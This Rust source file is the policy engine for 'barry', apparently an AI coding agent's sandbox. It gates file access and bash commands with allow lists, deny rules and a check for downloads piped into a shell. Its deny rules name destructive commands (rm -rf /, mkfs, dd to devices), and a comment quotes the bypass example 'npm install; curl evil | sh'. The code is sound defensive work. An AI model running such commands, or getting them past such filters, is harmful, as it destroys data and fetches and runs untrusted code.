//! Policy engine for barry.
//!
//! Two layers: path-based decisions for file reads/writes, and rule-based
//! decisions for bash commands. Path canonicalisation rejects `..` and
//! resolves symlinks (PLAN 6.1.1, BC-3.5).

mod bash_parse;
mod path;

use std::path::{Component, Path, PathBuf};
use thiserror::Error;

pub use barry_protocol::Decision;
pub use bash_parse::{Analysis, SimpleCmd};
pub use path::{canonicalise, is_under, PathError};

/// Errors from the policy engine.
#[derive(Debug, Error)]
pub enum PolicyError {
    #[error("invalid path: {0:?}")]
    InvalidPath(PathBuf),
    #[error("invalid rule {id}: {reason}")]
    InvalidRule { id: String, reason: String },
}

/// Configuration for the policy engine (PLAN 6.1).
pub struct PolicyConfig {
    pub cwd: PathBuf,
    pub home: PathBuf,
    pub extra_writable: Vec<PathBuf>,
    pub read_deny: Vec<String>,
    pub protected: Vec<String>,
    pub rules: Vec<BashRule>,
    /// Whether sandboxed bash commands may access the network.
    pub network: bool,
}

/// A bash rule: a `match` string against a command, with a decision.
#[derive(Debug, Clone)]
pub struct BashRule {
    pub id: String,
    pub r#match: String,
    pub decision: Decision,
}

/// The writable roots for a session: cwd, extra writable dirs, and grants.
#[derive(Debug, Clone)]
pub struct Policy {
    cwd: PathBuf,
    read_deny: Vec<PathBuf>,
    protected: Vec<String>,
    /// Every existing path named by `protected` under a writable root.
    /// Computed once: walking the tree on each bash call is too slow.
    protected_paths: Vec<PathBuf>,
    writable_roots: Vec<PathBuf>,
    grants: Vec<PathBuf>,
    bash_grants: Vec<Vec<String>>,
    rules: Vec<BashRule>,
    network: bool,
}

impl Policy {
    pub fn new(cfg: PolicyConfig) -> Result<Self, PolicyError> {
        // Validate rules: each rule's `match` must be non-empty
        for rule in &cfg.rules {
            if rule.r#match.is_empty() {
                return Err(PolicyError::InvalidRule {
                    id: rule.id.clone(),
                    reason: "empty match pattern".into(),
                });
            }
        }

        let read_deny = cfg
            .read_deny
            .iter()
            .map(|entry| canonicalise_read_deny(&cfg.home, entry))
            .collect();

        // Canonicalize cwd and writable roots so that is_under() comparisons
        // work on macOS where /tmp is a symlink to /private/tmp (PLAN 6.1.1).
        let cwd = canonicalize_or_keep(&cfg.cwd);
        let mut writable_roots: Vec<PathBuf> = vec![cwd.clone()];
        writable_roots.extend(cfg.extra_writable.iter().map(|r| canonicalize_or_keep(r)));
        let protected_paths = collect_protected(&writable_roots, &cfg.protected);

        Ok(Self {
            cwd,
            read_deny,
            protected: cfg.protected,
            protected_paths,
            writable_roots,
            grants: Vec::new(),
            bash_grants: Vec::new(),
            rules: cfg.rules,
            network: cfg.network,
        })
    }

    /// Check a read against policy. Reads under a read-deny entry are denied;
    /// everything else is allowed.
    pub fn check_read(&self, path: &Path) -> Decision {
        let canonical = match canonicalise(&self.cwd, path) {
            Ok(c) => c,
            Err(_) => {
                return Decision::Deny {
                    reason: "cannot canonicalise path".into(),
                }
            }
        };

        for deny in &self.read_deny {
            if is_under(&canonical, deny) {
                return Decision::Deny {
                    reason: "path is read-denied".into(),
                };
            }
        }

        Decision::Allow
    }

    /// Check a write against policy.
    ///
    /// Returns `(Decision, Option<PathBuf>)`. The grant path, when `Some`,
    /// is the parent directory the user would need to grant.
    pub fn check_write(&self, path: &Path) -> (Decision, Option<PathBuf>) {
        let canonical = match canonicalise(&self.cwd, path) {
            Ok(c) => c,
            // A dangling symlink is not something the user can meaningfully
            // approve: the file that a write would create is elsewhere.
            Err(PathError::DanglingSymlink { .. }) => {
                return (
                    Decision::Deny {
                        reason: "path is a dangling symlink".into(),
                    },
                    None,
                )
            }
            Err(_) => {
                return (
                    Decision::Ask {
                        reason: "cannot canonicalise path".into(),
                    },
                    None,
                )
            }
        };

        // Explicit grants always win: a grant to a protected directory
        // (e.g. `.git`) is exactly what BC-4.5 asks for.
        for grant in &self.grants {
            if is_under(&canonical, grant) {
                return (Decision::Allow, None);
            }
        }

        // Protected path components (e.g. `.git`, `.env`) always ask.
        // Check every component, not just the final one (PLAN 6.1.1).
        for component in canonical.components() {
            if let Some(name) = component.as_os_str().to_str() {
                if self.protected.iter().any(|p| p == name) {
                    return (
                        Decision::Ask {
                            reason: format!("protected path: {name}"),
                        },
                        None,
                    );
                }
            }
        }

        // Inside a writable root: allow, no grant needed.
        for root in &self.writable_roots {
            if is_under(&canonical, root) {
                return (Decision::Allow, None);
            }
        }

        // Outside all writable roots: ask, with grant offered for the parent dir.
        let parent = canonical.parent().unwrap_or(Path::new("")).to_path_buf();
        (
            Decision::Ask {
                reason: "path is outside the working directory".into(),
            },
            Some(parent),
        )
    }

    /// Record a directory grant, making it writable for the rest of the session.
    pub fn grant_dir(&mut self, dir: &Path) -> Result<(), PolicyError> {
        let canonical = self.resolve_grant(dir)?;
        self.grants.push(canonical);
        Ok(())
    }

    /// Resolve a grant target to a canonical absolute path.
    ///
    /// `canonicalise` rejects `..` (PLAN 6.1.1), but a grant is explicit user
    /// permission, so `..` is resolved lexically here first. The base matters:
    /// an absolute path starts at the filesystem root, never at cwd, so
    /// `/a/../b` is `/b` and not `<cwd>/b`. Existing ancestors are then
    /// canonicalised so a grant compares equal to the symlink-resolved paths
    /// used everywhere else.
    fn resolve_grant(&self, dir: &Path) -> Result<PathBuf, PolicyError> {
        let mut normalised = if dir.is_absolute() {
            PathBuf::from(Component::RootDir.as_os_str())
        } else {
            self.cwd.clone()
        };
        for component in dir.components() {
            match component {
                Component::RootDir | Component::Prefix(_) | Component::CurDir => {}
                // `PathBuf::pop` on `/` is a no-op, so `..` cannot climb above
                // the root.
                Component::ParentDir => {
                    normalised.pop();
                }
                Component::Normal(name) => normalised.push(name),
            }
        }
        canonicalise(&self.cwd, &normalised)
            .map_err(|_| PolicyError::InvalidPath(dir.to_path_buf()))
    }

    /// Grant a bash command prefix for the rest of the session (PLAN 6.1.3:
    /// the first two argv tokens of the approved command). The prefix is
    /// compared token by token, and only against commands that are a single
    /// plain command, so an approval for `npm install` cannot be reused for
    /// `npm install; curl evil | sh`.
    pub fn approve_prefix(&mut self, argv_prefix: Vec<String>) {
        self.bash_grants.push(argv_prefix);
    }

    /// Session working directory.
    pub fn cwd(&self) -> &Path {
        &self.cwd
    }

    /// Writable roots (cwd + extra writable dirs). Grants are separate so the
    /// sandbox can mount them after protected paths.
    pub fn writable_roots(&self) -> &[PathBuf] {
        &self.writable_roots
    }

    /// Explicit directory grants, mounted read-write after protected paths.
    pub fn grants(&self) -> &[PathBuf] {
        &self.grants
    }

    /// Whether `path` lies under a directory granted this session.
    pub fn is_granted(&self, path: &Path) -> bool {
        let Ok(canonical) = canonicalise(&self.cwd, path) else {
            return false;
        };
        self.grants.iter().any(|grant| is_under(&canonical, grant))
    }

    /// Read-deny paths (canonicalised).
    pub fn read_deny_paths(&self) -> &[PathBuf] {
        &self.read_deny
    }

    /// Protected path components (e.g. ".git").
    pub fn protected(&self) -> &[String] {
        &self.protected
    }

    /// Existing paths named by [`Policy::protected`] under every writable root.
    ///
    /// Includes nested repositories (submodules, vendored crates) and extra
    /// writable roots, so the sandbox can mount all of them read-only.
    pub fn protected_paths(&self) -> &[PathBuf] {
        &self.protected_paths
    }

    /// Configured bash rules, in order.
    pub fn rules(&self) -> &[BashRule] {
        &self.rules
    }

    /// Whether sandboxed bash commands may access the network.
    pub fn network(&self) -> bool {
        self.network
    }

    /// Check a bash command against the rule table. Deny > ask > allow.
    ///
    /// The command is parsed first (PLAN 6.1.2). Anything the parser does not
    /// fully understand is an `Ask`, never an `Allow`: rule matching on raw
    /// strings is exactly how `env bash -c ...`, `ls\nrm x` and
    /// `find . -exec ...` used to slip through.
    pub fn check_bash(&self, command: &str) -> (Decision, Option<String>) {
        let commands = match bash_parse::analyse(command) {
            bash_parse::Analysis::Simple(commands) => commands,
            bash_parse::Analysis::Complex(reason) => {
                return (
                    Decision::Ask {
                        reason: format!("command cannot be analysed: {reason}"),
                    },
                    None,
                )
            }
        };
        if commands.is_empty() {
            return (
                Decision::Ask {
                    reason: "empty command".to_string(),
                },
                None,
            );
        }

        // 1. Deny rules apply to every sub-command, after wrapper stripping.
        //    A session grant never overrides a deny.
        for cmd in &commands {
            if let Some(rule) = deny_rule(&cmd.argv) {
                return (
                    Decision::Deny {
                        reason: format!("command matches deny rule: {rule}"),
                    },
                    None,
                );
            }
        }
        if pipes_into_shell(&commands) {
            return (
                Decision::Deny {
                    reason: "command pipes a download into a shell".to_string(),
                },
                None,
            );
        }

        // 2. Configured rules (exact match on the whole command).
        for rule in &self.rules {
            if command == rule.r#match {
                return (rule.decision.clone(), Some(rule.id.clone()));
            }
        }

        // 3. A redirect writes, so it needs the same permission a write does.
        for cmd in &commands {
            for target in &cmd.redirect_targets {
                let (decision, _) = self.check_write(Path::new(target));
                if !matches!(decision, Decision::Allow) {
                    return (
                        Decision::Ask {
                            reason: format!("redirect target needs approval: {target}"),
                        },
                        None,
                    );
                }
            }
        }

        // 4. Allow only when every sub-command matches an allow rule or a
        //    session grant.
        let mut grant_used = None;
        for cmd in &commands {
            if let Some(grant) = self
                .bash_grants
                .iter()
                .find(|grant| bash_parse::has_prefix(&cmd.argv, grant))
            {
                grant_used = Some(format!("grant: {}", grant.join(" ")));
                continue;
            }
            if !is_allowed(&cmd.argv) {
                return (
                    Decision::Ask {
                        reason: format!("no matching allow rule for: {}", cmd.argv.join(" ")),
                    },
                    None,
                );
            }
        }

        (Decision::Allow, grant_used)
    }
}

/// Commands that are read-only or part of the build loop, as argv prefixes.
/// Matching is word-bounded: `ls` no longer matches `lsblk` (PLAN 6.1.3).
const ALLOW_PREFIXES: &[&[&str]] = &[
    &["ls"],
    &["cat"],
    &["head"],
    &["tail"],
    &["wc"],
    &["pwd"],
    &["echo"],
    &["which"],
    &["file"],
    &["stat"],
    &["tree"],
    &["rg"],
    &["fd"],
    &["grep"],
    &["find"],
    &["sort"],
    &["uniq"],
    &["cut"],
    &["diff"],
    &["git", "status"],
    &["git", "diff"],
    &["git", "log"],
    &["git", "show"],
    &["git", "branch"],
    &["git", "rev-parse"],
    &["git", "blame"],
    &["cargo", "check"],
    &["cargo", "build"],
    &["cargo", "test"],
    &["cargo", "fmt"],
    &["cargo", "clippy"],
    &["cargo", "tree"],
    &["go", "build"],
    &["go", "test"],
    &["go", "vet"],
    &["npm", "test"],
    &["npm", "run", "lint"],
    &["npm", "run", "test"],
    &["npm", "run", "build"],
    &["python", "-m", "pytest"],
    &["pytest"],
    &["make", "test"],
];

/// `find` can execute or delete, so it is allow-listed only without those.
const FIND_UNSAFE_ARGS: &[&str] = &["-exec", "-execdir", "-delete", "-ok", "-okdir", "-fprint"];

/// Whether `argv` matches a default allow rule.
fn is_allowed(argv: &[String]) -> bool {
    let Some(head) = argv.first().map(String::as_str) else {
        return false;
    };
    // Bare `env` only prints the environment. With arguments it runs a
    // command, which is why `env bash -c ...` must not be allow-listed.
    if head == "env" {
        return argv.len() == 1;
    }
    if head == "find"
        && argv
            .iter()
            .any(|arg| FIND_UNSAFE_ARGS.contains(&arg.as_str()))
    {
        return false;
    }
    ALLOW_PREFIXES.iter().any(|prefix| {
        bash_parse::has_prefix(
            argv,
            &prefix.iter().map(|w| w.to_string()).collect::<Vec<_>>(),
        )
    })
}

/// A deny rule for one command, as a human-readable rule name.
fn deny_rule(argv: &[String]) -> Option<&'static str> {
    let head = argv.first()?.as_str();
    match head {
        "sudo" => Some("sudo"),
        "su" => Some("su"),
        "doas" => Some("doas"),
        "shutdown" => Some("shutdown"),
        "reboot" => Some("reboot"),
        "halt" => Some("halt"),
        "poweroff" => Some("poweroff"),
        _ if head.starts_with("mkfs") => Some("mkfs"),
        "rm" => {
            let has_recursive_flag = argv.iter().any(|a| a.starts_with('-') && a.contains('r'));
            let targets_root = argv
                .iter()
                .skip(1)
                .any(|a| a == "/" || a == "~" || a.starts_with("/*") || a.starts_with("~/*"));
            if has_recursive_flag && targets_root {
                Some("rm -rf on a root path")
            } else {
                None
            }
        }
        "chmod" => {
            if argv.iter().any(|a| a == "-R") && argv.iter().any(|a| a == "777") {
                Some("chmod -R 777")
            } else {
                None
            }
        }
        "chown" => {
            if argv.iter().any(|a| a == "-R") {
                Some("chown -R")
            } else {
                None
            }
        }
        "dd" => {
            if argv.iter().any(|a| a.starts_with("of=/dev/")) {
                Some("dd to a device")
            } else {
                None
            }
        }
        "git" => {
            let force = argv.iter().any(|a| {
                matches!(
                    a.as_str(),
                    "--force" | "-f" | "--force-with-lease" | "--force-if-includes"
                )
            });
            if argv.get(1).map(String::as_str) == Some("push") && force {
                Some("git push --force")
            } else {
                None
            }
        }
        _ => None,
    }
}

/// Whether a download is piped into a shell anywhere in the pipeline.
fn pipes_into_shell(commands: &[bash_parse::SimpleCmd]) -> bool {
    let mut download_seen = false;
    for cmd in commands {
        let Some(head) = cmd.argv.first().map(String::as_str) else {
            continue;
        };
        if matches!(head, "curl" | "wget") {
            download_seen = true;
        } else if download_seen && matches!(head, "sh" | "bash" | "zsh" | "dash" | "ksh") {
            return true;
        }
    }
    false
}

/// Expand `~` to `$HOME` in a path string.
fn expand_tilde(home: &Path, p: &str) -> PathBuf {
    let p = p.trim();
    if let Some(rest) = p.strip_prefix("~/") {
        home.join(rest)
    } else if p == "~" {
        home.to_path_buf()
    } else {
        PathBuf::from(p)
    }
}

/// Canonicalise a read-deny entry: expand `~`, then canonicalise if it exists.
fn canonicalise_read_deny(home: &Path, entry: &str) -> PathBuf {
    let path = expand_tilde(home, entry);
    if path.exists() {
        std::fs::canonicalize(&path).unwrap_or(path)
    } else {
        path
    }
}

/// Canonicalize `path` if it exists, otherwise return it unchanged.
/// Ensures canonical-form comparisons work on macOS where /tmp -> /private/tmp.
fn canonicalize_or_keep(path: &Path) -> PathBuf {
    if path.exists() {
        std::fs::canonicalize(path).unwrap_or_else(|_| path.to_path_buf())
    } else {
        path.to_path_buf()
    }
}

/// Find every entry named by `protected` under the writable `roots`.
///
/// A top-level `.git` is not enough: submodules and vendored repositories have
/// their own, and the sandbox must keep all of them read-only. Symlinks are not
/// followed, since they could point outside the writable tree, and a protected
/// directory is not descended into (a `.git` has thousands of objects).
fn collect_protected(roots: &[PathBuf], protected: &[String]) -> Vec<PathBuf> {
    let mut found = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for root in roots {
        collect_protected_under(root, protected, &mut found, &mut seen);
    }
    found
}

fn collect_protected_under(
    dir: &Path,
    protected: &[String],
    found: &mut Vec<PathBuf>,
    seen: &mut std::collections::HashSet<PathBuf>,
) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if protected.iter().any(|p| p.as_str() == name.as_ref()) {
            if seen.insert(path.clone()) {
                found.push(path);
            }
            continue;
        }
        let is_dir = entry.file_type().map(|t| t.is_dir()).unwrap_or(false);
        if is_dir {
            collect_protected_under(&path, protected, found, seen);
        }
    }
}
